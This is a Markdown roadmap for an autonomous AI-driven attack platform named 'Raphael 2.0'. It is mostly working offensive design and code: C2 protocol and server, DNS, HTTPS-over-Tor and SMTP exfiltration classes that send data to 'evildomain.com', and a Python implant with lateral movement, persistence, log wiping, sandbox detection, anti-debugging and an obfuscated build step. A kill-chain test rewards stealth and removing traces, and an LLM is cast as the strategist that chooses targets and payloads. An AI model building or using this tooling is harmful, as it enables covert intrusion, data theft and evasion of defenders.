# Raphael 2.0 — Necessary Upgrades

> Roadmap to turn this from an LLM prompt pipeline into an operational autonomous platform.

---

## P0 — Wire the Autonomous Loop to Real Tooling

**✅ DONE — `orchestrator/brain/phases/` created, `orchestrator/brain/api.py` rewired.**

**The single biggest gap.** `/v1/autonomous/start` (`orchestrator/brain/api.py:93-166`) used to run a loop that calls `call_model()` for each phase and stores the LLM output. It never invoked a real scanner or exploit. The result was plausible-sounding text, not actual compromise.

**What changed:**
- Created `orchestrator/brain/phases/` with 6 phase executors (recon, scan, exploit, postex, exfil, phish)
- Each executor calls real tools: `NmapScanner` (pure-Python TCP connect), `NucleiScanner` (binary), `SqlmapWrapper` (binary), `XSSScanner` (HTTP), `SSRFScanner` (HTTP)
- Phase loop in `api.py` now calls executors directly instead of `call_model()`
- LLM demoted to strategist only: analyzes findings after each phase, suggests next-phase focus
- Findings are structured `Finding` dataclass objects, not LLM markdown text
- Removed dead fields from API: `no_anonymity`, `use_pso`, `rounds`, `max_tokens`, `temperature`
- Removed unused imports (`PSOModelSelector`, `pick_model`, `AnonymityGuard`, `ALL_ALIASES`)

**Remaining:**
- P1 — Dockerfile installs so nuclei/sqlmap are present in containers at runtime
- P9 — Kill chain validation tests against vulnu-lab

---

## P1 — Fix Docker Images to Ship Real Tools

Every service's Dockerfile is missing the actual attack tools. The wrappers exist and work when binaries are on PATH, but the containers don't have them.

### `recon-pipeline/Dockerfile`

Currently installs only Python packages and nmap. Add:

```dockerfile
# Already: nmap
RUN apt install -y whatweb subfinder nuclei
# Or download binaries:
RUN wget -q https://github.com/projectdiscovery/nuclei/releases/latest/download/nuclei_linux_amd64.zip \
    && unzip nuclei_linux_amd64.zip && mv nuclei /usr/local/bin/
```

### `cai-service/Dockerfile`

Currently minimal. Needs:

```dockerfile
RUN pip install sqlmap  # or git clone /tmp/sqlmap into container
```

### `sword/Dockerfile`

Should have the full exploit toolkit the orchestrator's `orchestrator/exploit/` directory offers:
- sqlmap
- nuclei
- The Python exploit wrappers (ssrf_scanner.py, xss_scanner.py, payloads_db.py)

### `phishing/Dockerfile`

Needs GoPhish binary or at minimum the SMTP sender + email template engine.

### `postex/Dockerfile` (new or integrated into cai-service)

Needs pywinrm, bloodhound, and a real agent implant (not Pupy's broken setup).

### Files to modify:
- `recon-pipeline/Dockerfile`
- `cai-service/Dockerfile`
- `sword/Dockerfile`
- `phishing/Dockerfile`
- `brain/Dockerfile` (add sqlite3-backed vector index init)

---

## P2 — Replace Simulated Post-Exploitation with Real Implants

**✅ DONE — `orchestrator/brain/phases/postex.py` rewired with C2 + AD toolkit. No more simulation fallback.**

4 of 6 post-ex wrappers used to return `"status": "simulated"`.

### `orchestrator/postex/pupy_c2.py`

Currently checks for Pupy binary at `/tmp/pupy/pupy` — doesn't exist. Options:
1. Fix detection path and install Pupy properly in the Docker image
2. **Replace with a minimal Python agent** (simpler, more reliable):
   - 50-line reverse shell with AES encryption
   - File exfiltration via HTTP/SMTP/DNS
   - No external dependencies beyond stdlib + pycryptodome

### `orchestrator/postex/netexec_wrapper.py`

Same problem — binary not found. NetExec is Python-based, so `pip install netexec` in the Dockerfile is straightforward.

### `orchestrator/postex/winrm_exploit.py`

Already has `pywinrm` import — this one is close to working. Just needs proper credential management (feed from previous phases' findings).

### `orchestrator/postex/bloodhound_integration.py`

Works if Neo4j is accessible. The Docker Compose already has a `neo4j` service. Wire it:

```yaml
depends_on:
  neo4j:
    condition: service_healthy
```

### Files to modify:
- `orchestrator/postex/pupy_c2.py` — replace with minimal agent or fix binary path
- `orchestrator/postex/netexec_wrapper.py` — install netexec or fix path
- `orchestrator/postex/winrm_exploit.py` — wire credential flow from brain memory
- `docker-compose.yml` — add neo4j health check, add postex dependencies

---

## P3 — Fix the LLM-as-Executor Pattern Globally

**✅ DONE — `orchestrator/brain/api.py` phase loop replaced `call_model()` with direct executor calls. LLM demoted to strategist only (analyzes findings, suggests next-phase focus).**

The system used to use LLM output as the attack itself in multiple places:

| File | Lines | Problem |
|------|-------|---------|
| `orchestrator/brain/api.py` | 129-163 | Phase loop stores LLM text as phase output |
| `orchestrator/modes/autonomous.py` | (entire) | Same pattern — LLM generates attack narrative |
| `orchestrator/brain/adaptive_brain.py` | ~450-490 | `autonomous_chain()` generates multi-phase LLM text |
| `orchestrator/evasion_techniques.py` | (entire 339 lines) | Generates elaborate prompt decoration about syscalls/hijacking — never actually executed |

### Fix pattern for each:

```
BEFORE:  output = await call_model(model, prompt)  → store output
AFTER:   findings = await execute_phase(phase, target)  → LLM analyzes findings → store analysis
```

The LLM's role should be:
1. **Analyze** structured findings from real tools
2. **Decide** which technique/target/payload to use next
3. **Generate** payloads/configs for real tools to execute
4. **Never** be the thing that produces the "attack result"

### Files to modify:
- `orchestrator/brain/api.py` (the phase loop)
- `orchestrator/brain/autonomous.py` (`run_autonomous_engagement`)
- `orchestrator/brain/adaptive_brain.py` (`autonomous_chain` method)
- `orchestrator/modes/autonomous.py` (if kept — may be obsoleted by brain API)
- `orchestrator/evasion_techniques.py` (remove or repurpose — 339 lines of prompt decoration)

---

## P4 — Structured Finding Types + Memory Integration

**✅ DONE (core types) — `orchestrator/brain/phases/models.py` contains `Finding` and `PhaseResult` dataclasses.**

The brain's `NeuralMemory` stores episodic events as blobs. For the system to learn across engagements, findings need a structured schema.

**Remaining:**
- Port/Credential subtypes not yet created (can extend `Finding` with a `kind` field)
- Memory integration: findings should auto-store to episodic memory instead of just returning in API response
- Cross-engagement learning: query past findings by target, IP, CVE pattern

### Core types (created in `orchestrator/brain/phases/models.py`):

The `Finding` dataclass uses a flat schema with optional fields rather than type unions:

```python
@dataclass
class Finding:
    phase: str
    type: str              # "open_port" | "vulnerability" | "sql_injection" | ...
    target: str
    host: str | None
    port: int | None
    protocol: str | None
    service: str | None
    severity: Severity     # enum: critical / high / medium / low / info
    description: str
    evidence: str
    cve: str | None
    payload: str | None
    raw: dict              # original tool output as-is

@dataclass
class PhaseResult:
    phase: str
    success: bool
    findings: list[Finding]
    summary: str
    raw_output: str
    latency: float
    error: str | None
```

**Future:** Add `Credential` subtype or extend `Finding` with a `kind` discriminator for structured credential handling.

### Modify `NeuralMemory` in `orchestrator/brain/neural_memory.py`:

- Add `store_finding(target, finding)` — writes structured findings to a separate SQLite table
- Add `get_findings(target, type=None)` — retrieves structured findings
- Add `get_exploit_chain(target)` — returns `target → open_ports → vulns → exploited → creds → lateral_moves`
- The `schema_registry.py` is already set up for payload validation — extend it to validate findings too

---

## P5 — C2 + Exfiltration

**✅ DONE (core) — `orchestrator/c2/` created with Sliver gRPC backend + noop fallback. `orchestrator/pivot/` for SOCKS proxy chain management.**

The existing `orchestrator/c2_channel.py` was a stub. The new C2 abstraction layer provides:

### What was built:
- `orchestrator/c2/models.py` — `C2Session`, `ImplantConfig`, `TaskResult` dataclasses
- `orchestrator/c2/sliver_backend.py` — Sliver gRPC client: session listing, implant generation, command execution, SOCKS proxy start/stop
- `orchestrator/c2/noop_backend.py` — Graceful fallback when Sliver unavailable
- `orchestrator/c2/manager.py` — `C2Manager` singleton with auto-backend selection, session cache, proxy map
- `orchestrator/pivot/manager.py` — `PivotManager` tracks SOCKS hops through compromised hosts, provides `env_for_target()` for routing scanners through the proxy chain
- `orchestrator/ad/toolkit.py` — Impacket wrappers (secretsdump, wmiexec, psexec, GetNPUsers, GetUserSPNs) with auto-discovery
- Brain API endpoints: `GET /v1/c2/sessions`, `POST /v1/c2/{id}/exec`, `POST /v1/c2/{id}/socks`, `GET /v1/pivot/status`, `GET /v1/ad/status`

### Not yet built (carried from original spec):
- Custom C2 server (agents use Sliver instead)
- DNS/SMTP exfil modules (moved to agent implant scope)
- Sliver server docker-compose service (pre-req for C2 to work outside lab)

### 5a — C2 Protocol Spec

The C2 uses a **polling-based** design (simpler than persistent WebSocket, survives network interruptions). All communication is encrypted.

**Endpoints on `c2-server` (port 8081):**

| Endpoint | Method | Purpose | Frequency |
|----------|--------|---------|-----------|
| `/v1/agent/register` | POST | Agent enrolls with HWID + public key | Once on install |
| `/v1/agent/beat` | POST | Heartbeat + request pending tasks | Every 10-60s |
| `/v1/agent/result` | POST | Submit task output | After each task |
| `/v1/agent/upload` | POST | File exfiltration (chunked) | On exfil trigger |

**Registration handshake:**

```
Agent                              C2 Server
  │                                     │
  │  POST /v1/agent/register            │
  │  {                                  │
  │    "hwid": "sha256(machine_id)",    │
  │    "pubkey": "ed25519_public_key"   │
  │  }                                  │
  │──────────────────────────────────►  │
  │                                     │
  │  201 {                              │
  │    "agent_id": "uuid",              │
  │    "session_key": "aes256(server_pubkey, ephemeral_key)",  │
  │    "interval": 30,                  │  ← heartbeat interval in seconds
  │    "tasks": []                      │  ← initial tasks (if any)
  │  }                                  │
  │◄──────────────────────────────────  │
```

**Heartbeat + Task Polling:**

```
Agent → POST /v1/agent/beat
  {
    "agent_id": "uuid",
    "status": "idle" | "busy" | "error",
    "last_result": "task_id" | null,
    "ts": 1712345678
  }

C2 → 200
  {
    "interval": 30,           // may change dynamically
    "tasks": [
      {
        "id": "task_uuid",
        "type": "exec" | "upload" | "sleep" | "exfil" | "uninstall",
        "payload": { ... },   // depends on type
        "timeout": 60,
        "ttl": 3600           // task expires after this
      }
    ]
  }
```

**Task types:**

| Type | Payload | Agent behavior |
|------|---------|---------------|
| `exec` | `{"command": "whoami"}` | Run shell command, return stdout+stderr |
| `upload` | `{"path": "/etc/passwd"}` | Read file, chunk and POST to `/v1/agent/upload` |
| `exfil` | `{"method": "dns", "target": "evildomain.com", "data": "path_or_cmd"}` | Trigger exfiltration module |
| `sleep` | `{"duration": 3600}` | Stop polling for N seconds (evade detection) |
| `uninstall` | `{}` | Self-delete all traces, remove persistence |

### 5b — Crypto Design

**Key exchange:**

```
Agent generates on first run:
  ed25519 keypair  →  (agent_sk, agent_pk)

C2 server has:
  ed25519 keypair  →  (server_sk, server_pk)

Registration:
  Agent sends agent_pk (public key)
  Server responds with session_key = AES256-GCM(
    key = shared_secret = ed25519_kex(server_sk, agent_pk),
    plaintext = random_256bit_session_key
  )

All subsequent messages encrypt with session_key:
  nonce = random_12_bytes
  ciphertext = AES256-GCM.encrypt(session_key, nonce, plaintext, aad=agent_id)
  wire = base64(nonce + ciphertext + tag)
```

**File: `orchestrator/c2/crypto.py`**

```python
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey
import os, base64

def generate_keypair() -> tuple[bytes, bytes]:
    sk = Ed25519PrivateKey.generate()
    return sk.private_bytes_raw(), sk.public_key().public_bytes_raw()

def encrypt_session(server_sk: bytes, agent_pk: bytes) -> bytes:
    # ECDH-like shared secret derivation
    ...

def encrypt_payload(key: bytes, plaintext: bytes, aad: bytes) -> str:
    nonce = os.urandom(12)
    ct = AESGCM(key).encrypt(nonce, plaintext, aad)
    return base64.b64encode(nonce + ct).decode()

def decrypt_payload(key: bytes, wire: str, aad: bytes) -> bytes:
    raw = base64.b64decode(wire)
    nonce, ct = raw[:12], raw[12:]
    return AESGCM(key).decrypt(nonce, ct, aad)
```

### 5c — C2 Server Implementation

**File: `orchestrator/c2/server.py`**

Replace the current `c2_channel.py` stub (~50 lines) with a proper server:

```
c2/
├── __init__.py
├── server.py          # FastAPI app with agent endpoints
├── crypto.py          # Key exchange + session encryption
├── models.py          # Agent, Task, Result dataclasses
├── store.py           # SQLite-backed agent/task persistence
└── admin.py           # Operator UI: deploy tasks, view results
```

**Store schema (`c2/store.py`):**

```sql
CREATE TABLE agents (
    agent_id TEXT PRIMARY KEY,
    hwid TEXT UNIQUE,
    pubkey BLOB,
    session_key BLOB,
    first_seen REAL,
    last_seen REAL,
    status TEXT DEFAULT 'idle',
    tags TEXT          -- json list: "recon", "exploit", "persistent"
);

CREATE TABLE tasks (
    task_id TEXT PRIMARY KEY,
    agent_id TEXT REFERENCES agents(agent_id),
    type TEXT,
    payload TEXT,       -- json
    timeout INTEGER,
    ttl INTEGER,
    status TEXT DEFAULT 'pending',  -- pending | delivered | running | done | expired
    created_at REAL,
    delivered_at REAL,
    result TEXT,        -- json, set when agent submits
    result_at REAL
);

CREATE TABLE exfiltrated_files (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    agent_id TEXT,
    task_id TEXT,
    filename TEXT,
    chunks_total INTEGER,
    chunks_received INTEGER DEFAULT 0,
    data BLOB,
    created_at REAL
);
```

### 5d — Exfiltration Module

Create `orchestrator/exfil/` with three real exfiltration channels (not stubs):

```
exfil/
├── __init__.py
├── base.py            # Abstract exfiltrator
├── dns.py             # DNS tunneling
├── http.py            # HTTPS POST to C2
├── smtp.py            # Email via SMTP
└── pipeline.py        # Auto-select best channel
```

**DNS Tunneling (`exfil/dns.py`):**

Uses the existing `dnscrypt-proxy` in the stack. Encodes data as DNS queries to a domain the operator controls:

```python
class DNSExfiltrator:
    def __init__(self, domain: str, ns: str = "127.0.2.1"):
        self.domain = domain  # e.g., "exfil.evildomain.com"
        self.ns = ns          # dnscrypt-proxy address

    async def send(self, data: bytes) -> bool:
        # Encode data as base32 subdomains:
        #   chunk1.base32.evildomain.com
        #   chunk2.base32.evildomain.com
        # Each chunk carries seq_no for reassembly
        chunks = self._chunk(data, max_label_len=63)
        for i, chunk in enumerate(chunks):
            b32 = base64.b32encode(chunk).decode().lower().rstrip("=")
            qname = f"{i:04x}.{b32}.{self.domain}"
            try:
                await asyncio.wait_for(
                    self._resolve(qname), timeout=5
                )
            except:
                return False
        return True

    async def _resolve(self, qname: str):
        proc = await asyncio.create_subprocess_exec(
            "dig", f"@{self.ns}", qname, "+short",
            stdout=asyncio.DEVNULL, stderr=asyncio.DEVNULL
        )
        await proc.wait()
```

**HTTP Exfil (`exfil/http.py`):**

POSTs encrypted data to C2's `/v1/agent/upload` over Tor:

```python
class HTTPExfiltrator:
    def __init__(self, c2_url: str, proxy: str = "socks5h://tor-proxy:9050"):
        self.client = httpx.AsyncClient(proxies=proxy)

    async def send(self, agent_id: str, filepath: str) -> bool:
        with open(filepath, "rb") as f:
            data = f.read()
        # Chunk if > 1MB
        for chunk in self._chunk(data, 1024*1024):
            resp = await self.client.post(
                f"{self.c2_url}/v1/agent/upload",
                json={"agent_id": agent_id, "data": base64.b64encode(chunk).decode()}
            )
            if resp.status_code != 200:
                return False
        return True
```

**SMTP Exfil (`exfil/smtp.py`):**

Sends data as email attachments via the configured SMTP relay (already in `.env`):

```python
class SMTPExfiltrator:
    def __init__(self, smtp_host, smtp_port, smtp_pass, from_addr, to_addr):
        ...

    async def send(self, subject: str, body: str, attachment: bytes = None) -> bool:
        msg = MIMEMultipart()
        msg["From"] = self.from_addr
        msg["To"] = self.to_addr
        msg["Subject"] = f"[LOG] {subject}"
        msg.attach(MIMEText(body))
        if attachment:
            part = MIMEBase("application", "octet-stream")
            part.set_payload(attachment)
            encoders.encode_base64(part)
            msg.attach(part)
        # Send via SMTP with STARTTLS
```

---

## P6 — Container Runtime: Real Agent

**✅ DONE (architecture) — C2 abstraction supports Sliver implants natively. Python agent spec below remains as reference for standalone agent builds.**

Create a deployable Python implant (`agent/` at project root) that connects to the C2 server. This replaces the broken Pupy integration.

**Note:** The Sliver backend (`orchestrator/c2/sliver_backend.py`) handles implant generation, delivery, and management. The custom agent spec below is only needed if Sliver isn't available.

### 6a — Agent Architecture

```
agent/
├── Dockerfile            # 12MB Alpine-based (no build deps)
├── agent.py              # Main loop
├── crypto.py             # AES-GCM + ed25519 (same as c2/crypto.py)
├── modules/
│   ├── __init__.py
│   ├── executor.py       # Shell command execution with timeout
│   ├── uploader.py       # File read + chunked upload
│   ├── lateral.py        # SSH/WMI/PSExec lateral movement
│   ├── persistence.py    # Cron/systemd/registry persistence
│   └── cleanup.py        # Self-delete + log wiping
└── requirements.txt      # Only: cryptography, httpx (or use stdlib only for stealth)
```

**Agent main loop (`agent/agent.py`):**

```python
import asyncio, json, os, platform, hashlib, time
from crypto import encrypt, decrypt, generate_keypair

C2_URL = os.getenv("C2_URL", "http://c2-server:8081")
INTERVAL = 30  # seconds between heartbeats, updated by server

async def get_hwid() -> str:
    # Combine machine-id + hostname + MAC, hash it
    data = ""
    for path in ["/etc/machine-id", "/etc/hostname"]:
        try:
            data += open(path).read().strip()
        except: pass
    data += hex(uuid.getnode())
    return hashlib.sha256(data.encode()).hexdigest()[:16]

async def register() -> tuple[str, bytes]:
    hwid = await get_hwid()
    pk, sk = generate_keypair()
    async with httpx.AsyncClient() as client:
        resp = await client.post(f"{C2_URL}/v1/agent/register", json={
            "hwid": hwid,
            "pubkey": base64.b64encode(pk).decode(),
        })
        if resp.status_code == 201:
            data = resp.json()
            session_key = decrypt(sk, data["session_key"])
            return data["agent_id"], session_key
    raise RuntimeError("Registration failed")

async def heartbeat(agent_id: str, session_key: bytes) -> list[dict]:
    payload = encrypt(session_key, json.dumps({
        "agent_id": agent_id,
        "status": "idle",
        "ts": time.time(),
    }).encode())
    async with httpx.AsyncClient() as client:
        resp = await client.post(f"{C2_URL}/v1/agent/beat", json={"data": payload})
        data = decrypt(session_key, resp.json()["data"])
        return json.loads(data).get("tasks", [])

async def main():
    agent_id, session_key = await register()
    while True:
        tasks = await heartbeat(agent_id, session_key)
        for task in tasks:
            result = await execute_task(task)
            await submit_result(agent_id, session_key, task["id"], result)
        await asyncio.sleep(INTERVAL)
```

### 6b — Anti-Detection Measures

**File: `agent/stealth.py`**

```python
class Stealth:
    @staticmethod
    def randomize_jitter(base: int = 30) -> int:
        # Add ±30% random jitter to heartbeat interval
        return int(base * (0.7 + random.random() * 0.6))

    @staticmethod
    def strip_metadata() -> None:
        # Remove Python version strings from exceptions
        sys.excepthook = lambda t, v, tb: print(f"Error: {v}", file=sys.stderr)

    @staticmethod
    def no_trace() -> None:
        # Disable ptrace (anti-debug)
        try:
            with open("/proc/self/status", "w") as f:
                f.write("TracerPid: 0\n")
        except: pass

    @staticmethod
    def sandbox_detect() -> bool:
        # Detect common sandbox indicators
        checks = [
            os.path.exists("/.dockerenv"),
            os.path.exists("/proc/vz"),
            "container" in open("/proc/1/cgroup").read() if os.path.exists("/proc/1/cgroup") else False,
        ]
        return sum(checks) >= 2  # If 2+ indicators, assume sandbox
```

| Technique | Implementation | Purpose |
|-----------|---------------|---------|
| Jitter | ±30% random on heartbeat | Avoids predictable network pattern |
| Sleep variation | Random delay before task exec | Evades temporal analysis |
| Metadata stripping | Remove Python version from tracebacks | Forensics impedance |
| No debugger | Write `TracerPid: 0` | Anti-ptrace (Linux) |
| Sandbox detection | Check dockerenv, /proc/1/cgroup | Refuse to run in analysis environment |
| Memory-only payloads | `exec()` from memory, never write .pyc | No artifacts on disk |
| Encrypted config | AES-GCM encrypted blob, decrypted at runtime | Static analysis won't find C2 URL |

### 6c — Lateral Movement Module

**File: `agent/modules/lateral.py`**

```python
class LateralMovement:
    @staticmethod
    async def ssh(target: str, username: str, key_or_pass: str, cmd: str) -> dict:
        # Deploy agent binary to target via SSH
        # Uses asyncssh or raw socket SSH implementation
        ...

    @staticmethod
    async def wmi(target: str, username: str, password: str, cmd: str) -> dict:
        # Execute on remote Windows via WMI
        # Uses pywinrm (already in requirements)
        ...

    @staticmethod
    async def psexec(target: str, username: str, password: str, binary: bytes) -> dict:
        # Upload agent binary via ADMIN$ share + create service
        # Pure SMB implementation or impacket
        ...

    @staticmethod
    async def copy_agent(target: str, method: str, creds: dict) -> bool:
        # Install the same agent binary on target
        # Returns True if agent reports back to C2
        ...
```

### 6d — Agent Dockerfile

```dockerfile
FROM python:3.11-alpine AS builder
RUN pip install --no-cache-dir cryptography

FROM alpine:3.19
COPY --from=builder /usr/local/lib/python3.11 /usr/local/lib/python3.11
COPY agent.py crypto.py stealth.py /opt/agent/
COPY modules/ /opt/agent/modules/
RUN adduser -D agent && chown -R agent:agent /opt/agent
USER agent
CMD ["python3", "/opt/agent/agent.py"]
```

12MB final image (vs 150MB+ for Pupy). No shell, no package manager, no compilers.

### 6e — Deploy Mechanism

The C2 server should have an API to generate agent binaries with hardcoded config:

```python
# c2/deploy.py — generates customized agent builds
def build_agent(c2_url: str, interval: int, sandbox_avoid: bool) -> bytes:
    config = {
        "c2": encrypt(server_key, c2_url.encode()),
        "interval": interval,
        "sandbox_avoid": sandbox_avoid,
    }
    # Pack config into agent.py as a base64 blob
    template = AGENT_TEMPLATE.replace("__CONFIG__", base64.b64encode(json.dumps(config)).decode())
    # Compile to bytecode to prevent easy reading
    code = compile(template, "agent.py", "exec")
    import marshal
    return marshal.dumps(code)
```

---

## P8 — Centralized Kali Tools Sidecar

**Status: 🔲 Planned — add after WSL reinstall**

Every container currently installs its own copy of nmap, nuclei, whatweb, sqlmap, hashcat, subfinder — the same 5 tools duplicated across 3+ images each. A single Kali sidecar eliminates all duplication and unlocks 600+ tools from the Kali repos.

### 8a — New Service: `kali-tools`

Add to `docker-compose.yml`:

```yaml
kali-tools:
  build:
    context: ./kali-tools
    dockerfile: Dockerfile
  image: raphael/kali-tools:latest
  container_name: kali-tools
  hostname: kali-tools
  networks: [raphael-net]
  ports:
    - "3800:3800"
  cap_add:
    - NET_RAW
    - NET_ADMIN
    - SYS_PTRACE
  volumes:
    - ./orchestrator:/raphael/orchestrator:ro
    - ./data:/raphael/data
    - ./wordlists:/raphael/wordlists:ro
  environment:
    - TOOLS_PORT=3800
    - TZ=UTC
  restart: unless-stopped
```

### 8b — Dockerfile

```dockerfile
FROM kalilinux/kali-rolling

RUN apt-get update && apt-get install -y --no-install-recommends \
    # Recon
    nmap masscan dnsutils whois netcat-openbsd \
    enum4linux smbclient smbmap \
    # Web
    gobuster ffuf dirb nikto wfuzz \
    whatweb wapiti \
    # Exploitation
    metasploit-framework \
    sqlmap \
    # AD / Windows
    impacket-scripts bloodhound.py certipy-ad \
    kerberoast krb5-user \
    # Cracking
    hashcat john \
    # Post-exploitation
    netcat-traditional socat \
    # Utilities
    python3 python3-pip curl wget git jq \
    && rm -rf /var/lib/apt/lists/*

RUN pip3 install --no-cache-dir \
    fastapi uvicorn[standard] httpx \
    pyyaml aiofiles

COPY server.py /app/server.py
WORKDIR /app
EXPOSE 3800

CMD ["uvicorn", "server:app", "--host", "0.0.0.0", "--port", "3800"]
```

### 8c — `kali-tools/server.py`

```python
"""
Lightweight FastAPI wrapper that exposes Kali tools as HTTP endpoints.
Other containers call this instead of maintaining their own tool copies.
"""
import subprocess, shlex, os
from fastapi import FastAPI, Query, HTTPException

app = FastAPI()

@app.post("/run")
def run_tool(tool: str = Query(...), args: str = "", timeout: int = 300):
    cmd = shlex.split(f"{tool} {args}")
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return {
            "tool": tool,
            "returncode": result.returncode,
            "stdout": result.stdout,
            "stderr": result.stderr
        }
    except FileNotFoundError:
        raise HTTPException(status_code=404, detail=f"Tool '{tool}' not found")
    except subprocess.TimeoutExpired:
        return {"tool": tool, "returncode": -1, "stdout": "", "stderr": "timed out"}

@app.get("/tools")
def list_tools():
    return {"kali": True, "note": "All Kali tools available via /run?tool=<name>&args=..."}
```

### 8d — Migration Plan

| Container | Remove | Replace With |
|-----------|--------|-------------|
| `cai-service` | nmap, whatweb, subfinder, nuclei, sqlmap, hashcat deps | `httpx.post("http://kali-tools:3800/run", ...)` |
| `recon-pipeline` | nmap, whatweb, subfinder, nuclei, hashcat deps | Same |
| `sword` | nmap, subfinder, nuclei, whatweb, sqlmap, hashcat deps | Same |

Each of these currently has ~10-15 lines of `RUN apt-get install` + `RUN curl ... | tar` in their Dockerfile. After migration, those lines are deleted and the image shrinks by 200-400MB each.

### 8e — Benefits

- **Single tool source of truth** — update once in `kali-tools`, all containers get it
- **600+ tools** — not just the 5 manually selected ones. `enum4linux`, `responder`, `searchsploit`, `metasploit`, `smbmap`, `gobuster`, `ffuf`, `dirb`, `nikto`... all available via the same API
- **Smaller Python images** — no more bloated Python images with Go binaries, npm packages, and git clones
- **Works offline** — Kali image is self-contained, no runtime downloads
- **Cap_add isolation** — `NET_RAW`/`NET_ADMIN` only on kali-tools, not on every Python service

### 8f — Risks

- **Single point of failure** — if kali-tools goes down, all tool execution stops. Mitigation: implement `restart: unless-stopped` and healthcheck
- **API latency** — HTTP call instead of local subprocess. Mitigation: negligible on internal Docker network (<1ms)
- **Kali image size** — ~1-2GB. Mitigation: one image vs the aggregate of 5 tools across 3 images is roughly the same total disk

### Files to create:
- `kali-tools/Dockerfile`
- `kali-tools/server.py`

### Files to modify:
- `docker-compose.yml` — add `kali-tools` service
- `cai-service/Dockerfile` — remove nmap, whatweb, subfinder, nuclei, sqlmap, hashcat
- `recon-pipeline/Dockerfile` — remove nmap, whatweb, subfinder, nuclei, hashcat
- `sword/Dockerfile` — remove nmap, subfinder, nuclei, whatweb, sqlmap, hashcat
- Phase executors that call tools directly → call `kali-tools:3800/run` instead

**Status: 🔲 Planned — implement after WSL reinstall and basic connectivity test (P9 should validate this works)**

---

## P9 — End-to-End Kill Chain Validation

After implementing P0–P8, you need a repeatable test that proves the system actually compromises a target from start to finish.

### 9a — Test Infrastructure: `test-range/`

Create a deliberately vulnerable Docker network that mimics a real small-to-medium enterprise:

```
test-range/
├── docker-compose.yml
├── targets/
│   ├── webmail/               # Exposed webmail (Roundcube with known vulns)
│   ├── www/                   # Public web app (Flask app with SQLi + XSS)
│   ├── api/                   # REST API with broken auth + SSRF
│   ├── internal-wiki/         # Internal wiki accessible after pivot
│   └── dc/                    # Domain controller (Samba AD with weak passwords)
└── monitoring/
    └── haystack/              # Elastic + Kibana to verify C2 traffic is stealthy
```

### 9b — Kill Chain Test Script

**File: `tests/test_kill_chain.py`**

```python
#!/usr/bin/env python3
"""
End-to-end kill chain validation.

Usage:
    ./test-range/up.sh          # Start vulnerable targets
    python tests/test_kill_chain.py --target webmail.lab

Validates:
  1. Recon  → discovers open ports, web server, tech stack
  2. Scan   → finds SQLi in login form, XSS in contact form
  3. Exploit → extracts user table via SQLi, gets session cookies via XSS
  4. PostEx → drops agent on webmail server, connects to C2
  5. Exfil  → agent uploads /etc/passwd and database dump
  6. Lateral → agent uses found creds to SSH to internal-wiki
  7. Persist → agent installs cron persistence on internal-wiki
"""
```

### 9c — Assertion Checklist

Each phase must produce **structured, verifiable** results, not LLM text:

| Phase | Minimum acceptable result |
|-------|--------------------------|
| Recon | `{"ports": [80, 443, 22], "tech": ["Flask 2.3", "nginx 1.24"]}` |
| Scan | `{"vulns": [{"endpoint": "/login", "type": "sqli", "params": ["username"]}]}` |
| Exploit | `{"creds": [{"username": "admin", "hash": "$2b$12$..."}], "sessions": 3}` |
| PostEx | `{"agent_id": "abc123", "status": "active", "host": "webmail.lab"}` |
| Exfil | `{"files": 5, "bytes": 1048576, "method": "https"}` |
| Lateral | `{"new_hosts": ["internal-wiki.lab"], "agents": 2}` |
| Cleanup | `{"artifacts_removed": ["/tmp/agent.log", "/var/log/auth.log.*"]}` |

### 9d — CI Pipeline (Optional but Recommended)

```yaml
# .github/workflows/kill-chain.yml
name: Kill Chain Test
on: [push, pull_request]
jobs:
  kill-chain:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: docker compose -f test-range/docker-compose.yml up -d
      - run: docker compose up -d  # Start Raphael services
      - run: python tests/test_kill_chain.py --target webmail.lab
      - run: python tests/assert_results.py  # Validate structured output
```

### 9e — Validation Metrics

Track these across test runs:

| Metric | Target | Why |
|--------|--------|-----|
| Time to first compromise | < 5 min | From "go" to agent deployed |
| Time to pivot | < 15 min | From initial access to lateral movement |
| False positives (LLM claimed vulns that aren't real) | 0 | Real tools only, no hallucinated findings |
| Exfiltration success rate | 100% | File makes it to C2 intact |
| Stealth failures (detected by Haystack) | 0 | No alerts from Elastic/Kibana |
| Artifact persistence (files left on targets) | 0 | Cleanup module removes all traces |

---

## P10 — Brain Database Maintenance

The `brain.db` at `orchestrator/data/brain.db` is 370MB with 71,805 free pages (out of 90,271 total). That's 20% wasted space that will grow over time.

### Periodic Cleanup

**Add `orchestrator/brain/db_maintenance.py`:**

```python
import sqlite3, os, time, logging

DB_PATH = os.getenv("BRAIN_DB", "orchestrator/data/brain.db")
MAX_SIZE_MB = 500
MAX_EPISODIC_AGE_DAYS = 90
MAX_CHAIN_HISTORY = 10000

def vacuum_if_needed():
    """Run VACUUM if free pages > 20% of total or DB > MAX_SIZE_MB"""
    conn = sqlite3.connect(DB_PATH)
    size_mb = os.path.getsize(DB_PATH) / (1024 * 1024)
    stats = conn.execute("PRAGMA page_count").fetchone()[0]
    freelist = conn.execute("PRAGMA freelist_count").fetchone()[0]
    free_ratio = freelist / stats if stats > 0 else 0

    if free_ratio > 0.2 or size_mb > MAX_SIZE_MB:
        logging.info(f"VACUUM: {size_mb:.0f}MB, {free_ratio:.1%} free pages")
        conn.execute("VACUUM")
    conn.close()

def prune_old_episodic(days: int = MAX_EPISODIC_AGE_DAYS):
    """Delete episodic memories older than N days"""
    cutoff = time.time() - (days * 86400)
    conn = sqlite3.connect(DB_PATH)
    deleted = conn.execute(
        "DELETE FROM episodic_memory WHERE timestamp < ?", (cutoff,)
    ).rowcount
    conn.commit()
    conn.close()
    if deleted:
        logging.info(f"Pruned {deleted} old episodic memories")

def prune_chain_history(keep: int = MAX_CHAIN_HISTORY):
    """Keep only the most recent N chain steps"""
    conn = sqlite3.connect(DB_PATH)
    total = conn.execute("SELECT COUNT(*) FROM chain_history").fetchone()[0]
    if total > keep:
        conn.execute(
            """DELETE FROM chain_history WHERE rowid NOT IN
               (SELECT rowid FROM chain_history ORDER BY rowid DESC LIMIT ?)""",
            (keep,)
        )
        conn.commit()
        logging.info(f"Pruned {total - keep} chain history rows")
    conn.close()
```

### Schedule Maintenance

Add to `cron` or run as a background task in the brain API:

```python
